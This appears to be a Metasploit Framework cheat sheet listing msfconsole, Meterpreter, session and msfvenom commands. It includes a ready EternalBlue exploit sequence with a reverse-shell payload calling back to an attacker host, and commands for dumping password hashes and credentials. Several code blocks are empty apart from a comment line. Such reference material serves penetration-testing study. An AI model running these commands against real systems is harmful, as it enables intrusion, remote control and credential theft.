## What is Metasploit?

**Metasploit Framework** is the world's most widely used penetration testing framework. Originally developed by H.D. Moore in 2003, it's now maintained by Rapid7. The framework includes thousands of exploits, hundreds of payloads, and extensive post-exploitation capabilities.

Metasploit comes pre-installed on Kali Linux. The free Community Edition is available at [metasploit.com](https://www.metasploit.com/).

## 📦 Installation & Starting

Kali Linux (Pre-installed)

```
msfconsole
```

Start with Database

```
sudo msfdb init
msfconsole
```

Start Quietly (No Banner)

```
msfconsole -q
```

Execute Commands on Start

```
msfconsole -x "use exploit/..."
```

## 🧭 Basic Navigation Commands

|Command|Description|
|---|---|
|help|Show all available commands|
|help <command>|Get help for specific command|
|exit / quit|Exit msfconsole|
|back|Go back from current module|
|banner|Display random banner|
|version|Show framework version|
|history|Show command history|
|connect <ip> <port>|Connect to host (like netcat)|

## 🔍 Searching Modules

```
# Basic search
```

### Module Types

exploit

Exploit vulnerabilities

auxiliary

Scanners, fuzzers, etc.

post

Post-exploitation modules

payload

Shellcode and payloads

encoder

Payload encoding

nop

NOP generators

evasion

AV evasion modules

## ⚙️ Using Modules

|Command|Description|
|---|---|
|use <module>|Select a module to use|
|info|Show module information|
|options / show options|Display module options|
|show advanced|Show advanced options|
|set <option> <value>|Set option value|
|setg <option> <value>|Set global option (persists)|
|unset <option>|Clear option value|
|show payloads|List compatible payloads|
|show targets|List exploit targets|
|check|Check if target is vulnerable|
|run / exploit|Execute the module|
|exploit -j|Run as background job|

📋 Example: Exploiting EternalBlue

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker>
exploit
```

## 💣 Payloads

### Payload Types

|Type|Description|
|---|---|
|singles|Self-contained payloads (no stager needed)|
|stagers|Small payloads that download the stage|
|stages|Downloaded by stagers (e.g., meterpreter)|

### Common Payloads

```
# Windows Meterpreter (staged)
```

💡 Staged vs Stageless

**Staged** (/) — smaller initial payload, downloads meterpreter. **Stageless** (_) — complete payload, larger but more reliable. Use stageless when network restrictions may block the stage download.

## 🎮 Meterpreter Commands

### Core Commands

|   |   |
|---|---|
|help|Show all commands|
|background|Background current session|
|exit|Terminate meterpreter session|
|sysinfo|System information|
|getuid|Current user ID|
|getpid|Current process ID|
|ps|List running processes|
|migrate <pid>|Migrate to another process|
|shell|Drop to system shell|

### File System Commands

|   |   |
|---|---|
|pwd|Print working directory|
|cd <path>|Change directory|
|ls|List files|
|cat <file>|Read file contents|
|download <file>|Download file to attacker|
|upload <file>|Upload file to target|
|edit <file>|Edit file with vim|
|search -f <pattern>|Search for files|

### Privilege Escalation

|   |   |
|---|---|
|getsystem|Attempt to get SYSTEM privileges|
|getprivs|List available privileges|
|hashdump|Dump password hashes (requires SYSTEM)|
|load kiwi|Load Mimikatz extension|
|creds_all|Dump all credentials (kiwi)|

### Network & Pivoting

|   |   |
|---|---|
|ipconfig / ifconfig|Show network configuration|
|arp|Display ARP cache|
|route|View routing table|
|portfwd add -l <lport> -p <rport> -r <host>|Port forwarding|
|run autoroute -s <subnet>|Add route for pivoting|

## 📡 Handlers & Listeners

```
# Set up handler for reverse shell
```

## 🔗 Session Management

|Command|Description|
|---|---|
|sessions|List all active sessions|
|sessions -i <id>|Interact with session|
|sessions -k <id>|Kill session|
|sessions -u <id>|Upgrade shell to meterpreter|
|sessions -c <cmd>|Run command on all sessions|

## ⚙️ Jobs Management

|   |   |
|---|---|
|jobs|List running jobs|
|jobs -k <id>|Kill a job|
|jobs -K|Kill all jobs|

## 🔧 Msfvenom Payload Generation

Msfvenom is used to generate standalone payloads outside of msfconsole.

```
# Windows executable
```

### Msfvenom Options

|   |   |
|---|---|
|-p|Payload to use|
|-f|Output format (exe, dll, elf, raw, etc.)|
|-o|Output file|
|-e|Encoder to use|
|-i|Encoding iterations|
|-b|Bad characters to avoid (e.g., \x00\x0a)|
|-l payloads|List all payloads|
|-l formats|List output formats|
|-l encoders|List encoders|

## 🗄️ Database Commands

```
# Initialize database
```

## 🎯 Useful Post-Exploitation Modules

```
# Windows
```

## 📚 Additional Resources

- [Official Metasploit Documentation](https://docs.metasploit.com/)
- [Metasploit GitHub Repository](https://github.com/rapid7/metasploit-framework)
- [Metasploit Unleashed (Free Course)](https://www.offensive-security.com/metasploit-unleashed/)